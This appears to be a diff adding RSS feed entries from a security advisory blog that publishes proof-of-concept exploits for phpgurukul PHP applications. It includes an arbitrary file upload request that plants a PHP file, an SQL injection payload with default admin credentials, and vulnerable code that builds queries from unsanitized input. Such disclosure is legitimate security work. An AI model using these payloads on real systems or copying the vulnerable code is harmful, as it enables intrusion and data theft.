+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;mysqli_num_rows&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;// output data of each row&lt;/span&gt;
+ &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mysqli_fetch_assoc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+   &lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;email&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;email&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+   &lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;password&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;password&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+ &lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;phone&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;phone&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$firstname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;firstname&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+     &lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;firstname&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;firstname&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+     &lt;span class=&quot;nv&quot;&gt;$fa&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;2FA&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>Mon, 19 Feb 2024 00:00:00 +0400</pubDate>
+        <link>http://localhost:8000//Employee-Management-System-1.0-SQL-Injection</link>
+        <link href="http://localhost:8000/Employee-Management-System-1.0-SQL-Injection"/>
+        <guid isPermaLink="true">http://localhost:8000/Employee-Management-System-1.0-SQL-Injection</guid>
+      </item>
+    
+      <item>
+        <title>Tourism Management System 2.0 Shell Upload</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;Exploit Title: Tourism Management System v2.0 - Arbitrary File Upload&lt;/li&gt;
+  &lt;li&gt;Google Dork: N/A&lt;/li&gt;
+  &lt;li&gt;Exploit Author: SoSPiro&lt;/li&gt;
+  &lt;li&gt;Date: 2024-02-18&lt;/li&gt;
+  &lt;li&gt;Vendor Homepage: https://phpgurukul.com&lt;/li&gt;
+  &lt;li&gt;Software Link: https://phpgurukul.com/tourism-management-system-free-download/&lt;/li&gt;
+  &lt;li&gt;Version: 2.0&lt;/li&gt;
+  &lt;li&gt;Tested on: Windows 10 Pro&lt;/li&gt;
+  &lt;li&gt;Impact: Allows admin to upload all files to the web server&lt;/li&gt;
+  &lt;li&gt;CVE : N/A&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;exploit-description&quot;&gt;Exploit Description:&lt;/h3&gt;
+&lt;p&gt;The application is prone to an arbitrary file-upload because it fails to adequately sanitize user-supplied input.&lt;/p&gt;
+
+&lt;h3 id=&quot;proof-of-concept-poc&quot;&gt;Proof of Concept (PoC):&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Request&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /zer/tms/admin/change-image.php?imgid=1 HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------390927495111779706051786831201
+Content-Length: 361
+Origin: http://localhost
+Connection: close
+Referer: http://localhost/zer/tms/admin/change-image.php?imgid=1
+Cookie: PHPSESSID=eqms3ipedmm41hqa1djnu1euhv
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+X-PwnFox-Color: red
+
+-----------------------------390927495111779706051786831201
+Content-Disposition: form-data; name=&quot;packageimage&quot;; filename=&quot;phpinfo.php&quot;
+Content-Type: text/plain
+
+&amp;lt;?php phpinfo();?&amp;gt;
+-----------------------------390927495111779706051786831201
+Content-Disposition: form-data; name=&quot;submit&quot;
+
+
+-----------------------------390927495111779706051786831201--
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Response&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
+Date: Sun, 18 Feb 2024 04:33:37 GMT
+Server: Apache/2.4.54 (Win64) PHP/8.1.13 mod_fcgid/2.3.10-dev
+X-Powered-By: PHP/8.1.13
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Connection: close
+Content-Type: text/html; charset=UTF-8
+Content-Length: 8146
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;hr /&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;File location: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://localhost/zer/tms/admin/pacakgeimages/phpinfo.php&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+</description>
+        <pubDate>Sun, 18 Feb 2024 00:00:00 +0400</pubDate>
+        <link>http://localhost:8000//Tourism-Management-System-2.0-Shell-Upload</link>
+        <link href="http://localhost:8000/Tourism-Management-System-2.0-Shell-Upload"/>
+        <guid isPermaLink="true">http://localhost:8000/Tourism-Management-System-2.0-Shell-Upload</guid>
+      </item>
+    
+      <item>
+        <title>User Registration And Login And User Management System 3.1 SQL Injection</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;Exploit Title: User Registration &amp;amp; Login and User Management System With admin panel 3.1 - SQL injection&lt;/li&gt;
+  &lt;li&gt;Application: User Registration &amp;amp; Login and User Management System&lt;/li&gt;
+  &lt;li&gt;Date: 17.02.2024&lt;/li&gt;
+  &lt;li&gt;Bugs: SQL Injection&lt;/li&gt;
+  &lt;li&gt;Exploit Author: SoSPiro&lt;/li&gt;
+  &lt;li&gt;Vendor Homepage: https://phpgurukul.com/&lt;/li&gt;
+  &lt;li&gt;Software Link: https://phpgurukul.com/user-registration-login-and-user-management-system-with-admin-panel/&lt;/li&gt;
+  &lt;li&gt;Tested on: Windows 10 64 bit Wampserver&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;description&quot;&gt;Description:&lt;/h3&gt;
+&lt;p&gt;The file bwdates-report-result.php contains a potential security vulnerability related to user input validation. The script retrieves user-provided date inputs without proper validation, making it susceptible to SQL injection attacks.&lt;/p&gt;
+
+&lt;h3 id=&quot;vulnerability-details&quot;&gt;Vulnerability Details:&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Application Name&lt;/strong&gt;: User Registration &amp;amp; Login and User Management System&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Software Link&lt;/strong&gt;: &lt;a href=&quot;https://phpgurukul.com/user-registration-login-and-user-management-system-with-admin-panel/&quot;&gt;Download Link&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Vendor Homepage&lt;/strong&gt;: &lt;a href=&quot;https://phpgurukul.com/&quot;&gt;Vendor Homepage&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;The vulnerability lies in the following code snippet:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$fdate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;fromdate&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$tdate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;todate&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;mysqli_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$con&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;select * from users where date(posting_date) between &apos;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fdate&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&apos; and &apos;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$tdate&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&apos;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$cnt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;mysqli_fetch_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The script directly uses the user-supplied $fdate and $tdate variables in an SQL query without validating or sanitizing the input. This creates a potential avenue for malicious users to manipulate the query and perform SQL injection attacks.&lt;/p&gt;
+
+&lt;h3 id=&quot;vulnerability-description&quot;&gt;Vulnerability Description:&lt;/h3&gt;
+
+&lt;p&gt;An attacker can exploit this vulnerability by crafting malicious input for the fromdate and todate parameters. By injecting SQL code into these fields, an attacker could manipulate the query to perform unauthorized actions on the database, potentially exposing sensitive information or even modifying the database contents.&lt;/p&gt;
+
+&lt;h3 id=&quot;proof-of-concept-poc&quot;&gt;Proof of Concept (PoC):&lt;/h3&gt;
+&lt;ol&gt;
+  &lt;li&gt;Visit the application locally at http://localhost/loginsystem/admin/ and login as admin
+admin user credentials which are installed by default&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;| Username | admin
+| Password |Test@12345
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Go to “B/w Dates Report”: http://localhost/loginsystem/admin/bwdates-report-ds.php&lt;/li&gt;
+  &lt;li&gt;Change the “To Datev” or “From Date” values. You can use this query by manipulating proxy tools like Burp Suite payload= “’ OR ‘1’=’1’; –”.&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+        <pubDate>Sat, 17 Feb 2024 00:00:00 +0400</pubDate>
+        <link>http://localhost:8000//User-Registration-And-Login-And-User-Management-System-3.1-SQL-Injection</link>
+        <link href="http://localhost:8000/User-Registration-And-Login-And-User-Management-System-3.1-SQL-Injection"/>
+        <guid isPermaLink="true">http://localhost:8000/User-Registration-And-Login-And-User-Management-System-3.1-SQL-Injection</guid>
+      </item>
+    
+  </channel>
+</rss>
